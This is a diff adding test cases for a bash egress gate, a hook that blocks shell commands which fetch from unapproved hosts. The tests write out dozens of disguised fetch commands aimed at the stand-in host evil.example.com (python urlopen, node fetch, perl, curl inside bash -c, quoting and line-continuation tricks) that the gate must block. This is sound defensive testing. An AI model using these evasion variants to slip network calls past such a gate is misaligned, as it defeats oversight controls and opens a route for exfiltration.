@@ -16,12 +16,16 @@
 //      judged on the REAL host.
 
 import { describe, it, expect } from 'vitest'
+import { readFileSync } from 'node:fs'
+import { dirname, join } from 'node:path'
+import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
 import { bashEgressDecision, hostOf, tokenize, targetTokens } from '../../scripts/hooks/bash-egress-gate.mjs'
 // @ts-expect-error -- plain .mjs hook script, no types
 import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'
 
 const EMPTY = { domains: [], prefixes: [], quarantineDomains: [] }
+const __dirname = dirname(fileURLToPath(import.meta.url))
 
 describe('bash egress gate: the hole the review found', () => {
   it('blocks a plain curl to a host nobody approved', () => {
@@ -908,5 +912,89 @@ describe('#777 review 16: --args split by quotes', () => {
     ["gdb -batch -ex run -$'a'rgs sh -c 'PAYLOAD'"],
   ].map(([c]) => [c.replaceAll('PAYLOAD', P15)]))('blocks %s', (command) => {
     expect(bashEgressDecision(command, EMPTY).blocked).toBe(true)
+  })
+})
+
+describe('#779: a fetch embedded in a python/node/perl/ruby shell-out is a fetch', () => {
+  // The shared case file pins the reading (heredoc-program-parity.test.ts); here the gate's
+  // decision on it. Every `/eg` case passed the gate on main cfcb7e88.
+  type OCase = { name: string; cmd: string; commands: string[]; note?: string }
+  const oCases: OCase[] = JSON.parse(readFileSync(join(__dirname, '..', '..', 'scripts', '__tests__', 'shell-out-cases.json'), 'utf-8')).cases
+  const must = oCases.filter((c) => c.name.endsWith('/eg') && !c.note)
+  it('has the cases', () => { expect(must.length).toBeGreaterThanOrEqual(90) })
+  it.each(must.map((c) => [c.name, c.cmd]))('blocks %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each(oCases.filter((c) => c.name.startsWith('neg/')).map((c) => [c.name, c.cmd]))('lets the benign %s through', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+  it.each([
+    [`echo '${E}' | bash`], [`printf '%s\\n' '${E}' | sh`], [`perl -le 'system("${E}")'`],
+    [`env -i bash -c '${E}'`], [`python3 -I -c 'import os; os.system("${E}")'`],
+  ])('blocks the -c variant %s', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+})
+
+describe('#779 round 6: the inline program behind any code flag, and behind a redirect', () => {
+  // Marveen comment 3846 item 4: only the exact -c/-e was read here, so a code-level fetcher
+  // behind --eval, -p, -Ic passed (8/10 forms on 37ba4d93). Item 1: `2>&1` was cut at its `&`.
+  const U = 'https://evil.example.com/x'
+  const FJ = `'fetch("${U}")'`
+  const FP = `'import urllib.request; urllib.request.urlopen("${U}")'`
+  it.each([
+    [`node --eval ${FJ}`], [`node --eval=${FJ}`], [`node -p ${FJ}`], [`node -pe ${FJ}`], [`node --print ${FJ}`],
+    [`python3 -Ic ${FP}`], [`python3 -uc ${FP}`], [`python3 2>&1 -c ${FP}`], [`python3 &>/dev/null -c ${FP}`],
+    [`python3 \\\n -c ${FP}`], [`python3 -c'import urllib.request; urllib.request.urlopen("${U}")'`],
+    [`perl -le 'print urlopen("${U}")'`], [`bash -lc 'curl ${U}'`],
+  ])('blocks %s', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each([
+    [`node -p 'process.version'`], [`python3 -Ic 'print(1)'`], [`python3 2>&1 -c 'print("${U}")'`],
+    [`python3 -Werror tool.py ${U}`], [`node --eval='console.log(1)' 2>&1 | tee log.txt`],
+  ])('lets %s through', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+})
+
+describe('#779 round 7: backslash-newline anywhere, quoted interpreter path and flag, $"..."', () => {
+  // Marveen comment 3861 items 1-12, the code-level fetcher variant (the shell-out variant is in
+  // scripts/__tests__/shell-out-cases.json).
+  const U = 'https://evil.example.com/x'
+  const PY = `import urllib.request; urllib.request.urlopen("${U}")`
+  it.each([
+    [`python3 -c \\\n '${PY}'`], [`python3 -c\\\n'${PY}'`], [`node --eval \\\n'fetch("${U}")'`],
+    [`python3 -I\\\n -c '${PY}'`], [`python3 2>&1\\\n -c '${PY}'`], [`"/usr/bin/python3" -c '${PY}'`],
+    [`node "--eval=fetch('${U}')"`], [`python3 "-c"'${PY}'`], [`python3 -"c" '${PY}'`],
+    [`python3 -c $"import urllib.request; urllib.request.urlopen('${U}')"`],
+  ])('blocks %s', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each([
+    [`python3 -c \\\n 'print("${U}")'`], [`"/usr/bin/python3" -c 'print("${U}")'`],
+    [`node "--eval=console.log('${U}')"`], [`echo "/usr/bin/python3" -c 'print("${U}")'`],
+    // bash rejects the glued -c'..' (invalid option), so its program never runs
+    [`bash -c\\\n'curl -s ${U}'`],
+  ])('lets %s through', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+})
+
+describe('#779 round 8: quoted Unicode and $HOME interpreter paths, quoted flag name', () => {
+  // Marveen comment 3865 A, B, the code-level fetcher variant.
+  const U = 'https://evil.example.com/x'
+  const PY = `'import urllib.request; urllib.request.urlopen("${U}")'`
+  it.each([
+    [`"/home/gábor/venv/bin/python3" -c ${PY}`], [`"$HOME/venv/bin/python3" -c ${PY}`],
+    [`node "--eval"="fetch('${U}')"`], [`node --"eval=fetch('${U}')"`],
+  ])('blocks %s', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each([
+    [`"/home/gábor/venv/bin/python3" -c 'print("${U}")'`], [`node "--eval"="console.log('${U}')"`],
+    [`echo "$HOME/venv/bin/python3" -c 'print("${U}")'`],
+  ])('lets %s through', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
   })
 })
